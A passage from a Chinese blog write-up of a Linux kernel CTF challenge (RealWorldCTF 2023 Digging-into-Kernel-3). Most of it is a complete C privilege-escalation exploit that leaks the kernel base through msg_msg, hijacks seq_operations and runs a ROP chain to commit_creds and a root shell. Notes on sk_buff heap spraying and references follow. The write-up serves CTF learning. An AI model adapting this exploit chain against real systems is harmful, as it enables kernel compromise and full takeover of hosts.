class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHM_SIZE 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BASE 0xffffffff81000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_CRED 0xffffffff82850580</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_RSP_RET 0xffffffff8100d3d3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADD_RSP_VAL_RET 0xffffffff8111347b</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_RDI_RET 0xffffffff8106ab4d</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS 0xffffffff81095c30</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE    0xffffffff81e00ef4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPGS_RET 0xffffffff81e01058</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHM_CLOSE 0xffffffff8124b180</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IRETQ 0xffffffff8102b4df</span></span><br><span class="line"><span class="keyword">int</span> seq_fd;</span><br><span class="line"><span class="keyword">int</span> dev_fd;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Error</span><span class="params">(<span class="keyword">char</span>* error)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m [?] %s\033[0m\n&quot;</span>,error);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Doing</span><span class="params">(<span class="keyword">char</span> * Doing)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m [*] %s \033[0m\n&quot;</span>,Doing);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Done</span><span class="params">(<span class="keyword">char</span> *Done)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m [+] %s \033[0m\n&quot;</span>,Done);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">readMsg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">writeMsg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *(<span class="keyword">long</span>*)msgp = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">    <span class="keyword">uint64_t</span>    prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    m_type;</span><br><span class="line">    <span class="keyword">uint64_t</span>    m_ts;</span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">    <span class="keyword">uint64_t</span>    security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span>    next;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[<span class="number">0x1000</span>-<span class="keyword">sizeof</span>(struct msg_msg)+SHM_SIZE-<span class="keyword">sizeof</span>(struct msg_msgseg)];</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">&#125;uafmsg;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">request</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int32_t</span> index;</span><br><span class="line">    <span class="keyword">int32_t</span> len;</span><br><span class="line">    <span class="keyword">void</span>* ptr;</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">&#125;request;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int32_t</span> index,<span class="keyword">int32_t</span> len,<span class="keyword">void</span> * ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    request req;</span><br><span class="line">    req.index = index;</span><br><span class="line">    req.len = len;</span><br><span class="line">    req.ptr = ptr;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0xDEADBEEF</span>, &amp;req);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">int32_t</span> index)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    request req;</span><br><span class="line">    req.index = index;</span><br><span class="line">    ioctl(dev_fd, <span class="number">0xC0DECAFE</span>, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">open_shm_file</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> shmid;</span><br><span class="line">	<span class="keyword">if</span> ((shmid=shmget(IPC_PRIVATE,<span class="number">100</span>,<span class="number">0600</span>))==<span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;[?] Shmget Error&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">char</span> *shmaddr=shmat(shmid,<span class="literal">NULL</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (shmaddr==(<span class="keyword">void</span>*)<span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;[?] Shmat Error&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> shmaddr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">leak_addr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Doing(<span class="string">&quot;Start Leaking addr&quot;</span>);</span><br><span class="line">    <span class="keyword">void</span>* buf = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">void</span>* recv = <span class="built_in">malloc</span>(<span class="number">0x1018</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> kernel_base;</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x20</span>,buf);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> qid = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">    <span class="keyword">if</span>(qid&lt;<span class="number">0</span>)</span><br><span class="line">        Error(<span class="string">&quot;Make Queue Error&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;uafmsg,<span class="number">0</span>,<span class="keyword">sizeof</span>(uafmsg));</span><br><span class="line">    writeMsg(qid,&amp;uafmsg,<span class="keyword">sizeof</span>(uafmsg),<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span>* shm_addr=open_shm_file();</span><br><span class="line">    <span class="keyword">if</span>(shmdt(shm_addr) &lt; <span class="number">0</span>) <span class="comment">//****注意要释放，否则会kernel panic</span></span><br><span class="line">        Error(<span class="string">&quot;shmdt!&quot;</span>);</span><br><span class="line">    readMsg(qid,recv,<span class="keyword">sizeof</span>(uafmsg),<span class="number">1</span>);</span><br><span class="line">    kernel_base = ((<span class="keyword">uint64_t</span>*)recv)[<span class="number">0x1fb</span>]- <span class="number">0x19ac6c0</span>;</span><br><span class="line">    <span class="comment">// printf(&quot;%lx&quot;,((uint64_t*)recv)[0x1fb]);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m [+] kernel_base_addr is %lx \033[0m\n&quot;</span>,kernel_base);</span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">    <span class="built_in">free</span>(recv);</span><br><span class="line">    Done(<span class="string">&quot;leaking Dne&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> kernel_base;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getR00t</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] Fail to get root\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Success!!! root now\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> pop_rdi_ret;</span><br><span class="line"><span class="keyword">uint64_t</span> init_cred;</span><br><span class="line"><span class="keyword">uint64_t</span> commit_creds;</span><br><span class="line"><span class="keyword">uint64_t</span> swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/rwctf&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(dev_fd&lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Error(<span class="string">&quot;open error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> data[<span class="number">0x20</span>];</span><br><span class="line">    <span class="keyword">uint64_t</span> offset  = leak_addr()-BASE;</span><br><span class="line">    <span class="keyword">uint64_t</span>* buf = (<span class="keyword">uint64_t</span>*)<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x20</span>,buf);<span class="comment">//需要申请回来</span></span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x20</span>,buf);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">1</span>);</span><br><span class="line">    seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">delete</span>(<span class="number">1</span>);</span><br><span class="line">    buf[<span class="number">0</span>] = ADD_RSP_VAL_RET+offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;???---&gt;%d&quot;</span>,setxattr(<span class="string">&quot;/exp1&quot;</span>, <span class="string">&quot;Photon&quot;</span>, buf, <span class="number">0x20</span>, <span class="number">0</span>));<span class="comment">//写上了object，但是出错了？？？__kmalloc的时候r12和rax设置有问题</span></span><br><span class="line">    <span class="comment">//add(1,0x20,buf);</span></span><br><span class="line">    pop_rdi_ret = POP_RDI_RET+offset;</span><br><span class="line">    init_cred = INIT_CRED+offset;</span><br><span class="line">    commit_creds = COMMIT_CREDS+offset;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE+offset;</span><br><span class="line">    </span><br><span class="line">    Doing(<span class="string">&quot;Start Trigger&quot;</span>);</span><br><span class="line">    <span class="comment">//read(seq_fd,data,0x20);</span></span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15, 0xbeefdead;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, pop_rdi_ret;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13, init_cred;&quot;</span> <span class="comment">// add rsp, 0x40 ; ret</span></span><br><span class="line">        <span class="string">&quot;mov r12, commit_creds;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp, swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx, 0x9999999999999999;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11, 0x8888888888888888;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10, 0x7777777777777777;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9, 0x6666666666666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8, 0x5555555555555555;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx, 0x4444444444444444;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, 8;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;???&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>效果如下</p>
<p><img src="https://s2.loli.net/2023/01/23/5y7XrNMJUi9guWH.png" alt=""></p>
<h3 id="利用sk-buff进行写"><a href="#利用sk-buff进行写" class="headerlink" title="利用sk_buff进行写"></a>利用sk_buff进行写</h3><p>sk_buff也同样可以提供任意大小对象的分配写入与释放，但是sk_buff本身不含任何用户数据，游湖数据被单独放在一个object中，然后由sk_buff中存放指向这个object的指针来管理。</p>
<p><img src="https://s2.loli.net/2023/01/27/r3atGL5O1MAXiT7.png" alt=""></p>
<p>sk_buff在内核协议栈中代表一个包，所以我们只需要创建一对socket，然后在上面发送接收数据包就可以实现sk_buff的分配与释放。比如我们可以用socketpair系统调用创建一对socket，然后进行read和write</p>
<p>对于本题如果想要劫持0x20的seq_operation的话这样做应该是行不通的，因为在内核中的用户data的object大小并不是我们指定的大小，而是还需要加上一个<code>SKB_SHARED_INFO_SIZE</code> ，这个部分称作分片结构，其大小为0x140。<code>skb_shared_info</code>分片结构和sk_buff的线性数据区内存分配及销毁时都是一起的。所以如果我们想要写SIZE大小的object，我们需要构造SIZE-0x140大小的buff数据才行。sk_buff行为如下图所示。headroom+data+tailroom部分为线性数据区，skb_shared_info为分片结构</p>
<p><img src="https://s2.loli.net/2023/01/27/wHfbFgM64qISkZv.png" alt=""></p>
<p>所以在本题中，如果我们想要用sk_buff进行改写operation，我们需要选择其他可以利用的结构体，满足条件至少为大小大于0x140。</p>
<p>这里可以采用的方法是利用泄露内核堆地址，然后劫持pipe_operation的函数表地址，在堆上伪造函数表进行ROP。这个方法和之后整理的D3CTF当中的D3HEAP方法类似，所以挪到那个地方讲，如果有空的话再在这题试一下</p>
<h1 id="D3CTF2022-D3heap"><a href="#D3CTF2022-D3heap" class="headerlink" title="[D3CTF2022]D3heap"></a>[D3CTF2022]D3heap</h1><p>等待施工…..</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a target="_blank" rel="noopener" href="https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/#Step-III-堆喷-sk-buff-伪造辅助消息，泄露-UAF-obj-地址">【CTF.0x06】D^ 3CTF2022 d3kheap 出题手记 - arttnba3’s blog</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/253478#h2-2">CVE-2017-6074 DCCP拥塞控制协议Double-Free提权分析-安全客 - 安全资讯平台 (anquanke.com)</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Photon</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://phot0n.com/2023/01/19/%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%E7%9B%B8%E5%85%B3/">http://phot0n.com/2023/01/19/%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%E7%9B%B8%E5%85%B3/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/kernel/">kernel</a><a class="post-meta__tags" href="/tags/pwn/">pwn</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/02/26/firmAE%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90/"><img class="prev-cover" src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">firmAE框架分析</div></div></a></div><div class="next-post pull-right"><a href="/2023/01/02/CatCTF2022/"><img class="next-cover" src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">CatCTF2022</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2023/04/19/CVE-2016-9793%E5%88%86%E6%9E%90/" title="CVE-2016-9793分析"><img class="cover" src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-19</div><div class="title">CVE-2016-9793分析</div></div></a></div><div><a href="/2022/11/17/KernelPwn%E5%85%A5%E9%97%A8/" title="KernelPwn入门"><img class="cover" src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-17</div><div class="title">KernelPwn入门</div></div></a></div><div><a href="/2023/04/17/ucore-lab/" title="ucore-lab"><img class="cover" src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-17</div><div class="title">ucore-lab</div></div></a></div><div><a href="/2023/09/11/HITCONCTF-2023/" title="HITCONCTF-2023"><img class="cover" src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-11</div><div class="title">HITCONCTF-2023</div></div></a></div><div><a href="/2023/09/06/%E8%BF%91%E6%9C%9F%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" title="近期比赛复现"><img class="cover" src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-06</div><div class="title">近期比赛复现</div></div></a></div><div><a href="/2023/08/29/WriteUps-for-some-problems-in-SekaiCTF-2023/" title="WriteUps for some problems in SekaiCTF-2023"><img class="cover" src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-29</div><div class="title">WriteUps for some problems in SekaiCTF-2023</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comment</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2022/01/19/K4TwFgDxsJ62tEo.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Photon</div><div class="author-info__description">光子</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">55</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">32</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/photonwork"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/photonwork" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#slub%E5%88%86%E9%85%8D"><span class="toc-number">1.</span> <span class="toc-text">slub分配</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#REALWORDCTF-2023-%E4%BD%93%E9%AA%8C%E8%B5%9B-Digging-into-Kernel-3"><span class="toc-number">2.</span> <span class="toc-text">[REALWORDCTF 2023 体验赛] Digging-into-Kernel-3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pre-%E6%8F%90%E5%8F%96vmlinux%E8%8E%B7%E5%8F%96%E7%AC%A6%E5%8F%B7"><span class="toc-number">2.1.</span> <span class="toc-text">Pre.提取vmlinux获取符号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pre-%E8%B0%83%E8%AF%95%E5%87%86%E5%A4%87"><span class="toc-number">2.2.</span> <span class="toc-text">Pre.调试准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis-%E7%AE%80%E7%95%A5%E5%88%86%E6%9E%90"><span class="toc-number">2.3.</span> <span class="toc-text">Analysis.简略分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis-%E5%86%85%E6%A0%B8%E5%9F%BA%E5%9D%80%E6%B3%84%E9%9C%B2"><span class="toc-number">2.4.</span> <span class="toc-text">Analysis.内核基址泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 